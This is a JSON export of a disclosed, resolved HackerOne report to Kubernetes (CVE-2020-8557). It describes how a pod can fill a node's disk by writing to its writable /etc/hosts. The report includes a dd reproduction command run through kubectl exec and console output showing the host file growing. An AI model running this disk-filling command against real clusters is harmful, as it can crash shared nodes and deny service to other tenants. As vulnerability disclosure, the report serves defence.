{
  "id": 867699,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Njc2OTk=",
  "url": "https://hackerone.com/reports/867699",
  "title": "Node disk DOS by writing to container /etc/hosts",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-05-07T07:11:29.039Z",
  "submitted_at": "2020-05-07T07:11:29.039Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "kebe",
    "url": "/kebe",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 39386,
    "url": "https://hackerone.com/kubernetes",
    "handle": "kubernetes",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Kubernetes",
      "twitter_handle": "kubernetesio",
      "website": "https://kubernetes.io/",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2020-8557"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-07-22T01:34:00.937Z",
  "bug_reporter_agreed_on_going_public_at": "2020-07-22T01:34:00.874Z",
  "team_member_agreed_on_going_public_at": "2020-07-21T19:17:17.411Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Report Submission Form\n\n## Summary:\nPod files /etc/hosts, /etc/hostname, /etc/resolve.conf are not readonly.\nA normal pod running in kubernetes cluster can kil a host through write data to /etc/hosts.\nNot only /etc/hosts, but also /etc/resolve.conf and /etc/hostname can do this.\n\n## Kubernetes Version:\n<=1.18\n\n## Component Version:\nDocker 19.03\n\n## Steps To Reproduce:\n\n  1. use kubectl create a pod like kubectl run \n  2. run `kubectl exec -it $POD_NAME -- dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M`\n  3. run `df -h /var/lib/kubelet` on host that pod running, you can see the disk avaliable space are decreasing until the disk full.\n\n## Supporting Material/References:\n```console\n[root@kebe-sm-315 ~]# kubectl exec -it rate-c848c5c8b-5b8vm sh\nkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl kubectl exec [POD] -- [COMMAND] instead.\nDefaulting container name to rate.\nUse 'kubectl describe pod/rate-c848c5c8b-5b8vm -n default' to see all of the containers in this pod.\n/ # df -h\nFilesystem                Size      Used Available Use% Mounted on\n/dev/mapper/docker-8:16-67108930-710dfe5c781bd17e11968371b9d0f84641a2efde95c68a47eddf9ae518e768d1\n                         10.0G     40.3M     10.0G   0% /\ntmpfs                    64.0M         0     64.0M   0% /dev\ntmpfs                     9.7G         0      9.7G   0% /sys/fs/cgroup\n/dev/mapper/centos-root\n                         53.0G     28.6G     24.4G  54% /dev/termination-log\n/dev/sdb                100.0G     40.9G     59.1G  41% /etc/resolv.conf\n/dev/sdb                100.0G     40.9G     59.1G  41% /etc/hostname\n/dev/mapper/centos-root\n                         53.0G     28.6G     24.4G  54% /etc/hosts\nshm                      64.0M      8.0K     64.0M   0% /dev/shm\ntmpfs                     9.7G     12.0K      9.7G   0% /var/run/secrets/kubernetes.io/serviceaccount\ntmpfs                     9.7G         0      9.7G   0% /proc/acpi\ntmpfs                    64.0M         0     64.0M   0% /proc/kcore\ntmpfs                    64.0M         0     64.0M   0% /proc/keys\ntmpfs                    64.0M         0     64.0M   0% /proc/timer_list\ntmpfs                    64.0M         0     64.0M   0% /proc/timer_stats\ntmpfs                    64.0M         0     64.0M   0% /proc/sched_debug\ntmpfs                     9.7G         0      9.7G   0% /proc/scsi\ntmpfs                     9.7G         0      9.7G   0% /sys/firmware\n\n[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# ls -al\n总用量 12\ndrwxr-xr-x  5 root root   71 5月   7 12:29 .\ndrwxr-x--- 50 root root 4096 5月   7 12:29 ..\ndrwxr-x---  5 root root   55 5月   7 12:31 containers\n-rw-r--r--  1 root root  270 5月   7 12:31 etc-hosts\ndrwxr-x---  3 root root   37 5月   7 12:29 plugins\ndrwxr-xr-x  4 root root   65 5月   7 12:29 volumes\n[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# kubectl exec -it rate-c848c5c8b-5b8vm -- dd if=/dev/zero of=/etc/hosts count=100 bs=1M\nDefaulting container name to rate.\nUse 'kubectl describe pod/rate-c848c5c8b-5b8vm -n default' to see all of the containers in this pod.\n100+0 records in\n100+0 records out\n[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# ls -al\n总用量 102408\ndrwxr-xr-x  5 root root        71 5月   7 12:29 .\ndrwxr-x--- 50 root root      4096 5月   7 12:29 ..\ndrwxr-x---  5 root root        55 5月   7 12:31 containers\n-rw-r--r--  1 root root 104857600 5月   7 15:06 etc-hosts\ndrwxr-x---  3 root root        37 5月   7 12:29 plugins\ndrwxr-xr-x  4 root root        65 5月   7 12:29 volumes\n```\n\n  * [attachment / reference]\n\n## Impact\n\nIf someone create a pod on a public cloud with kubernetes, the host of the provider may panic due to disk full.",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-08-20T19:17:17.514Z",
  "allow_singular_disclosure_after": -109880795.41759552,
  "singular_disclosure_allowed": true,
  "vote_count": 159,
  "voters": [
    "0xl0v3r",
    "black_wheatear",
    "jatindhankhar",
    "rook1337",
    "tess",
    "mik317",
    "hannanhaseeb",
    "predator_97",
    "salahhasoneh",
    "mattberg",
    "and 149 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.5,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 32459,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/kubernetes/kubernetes",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
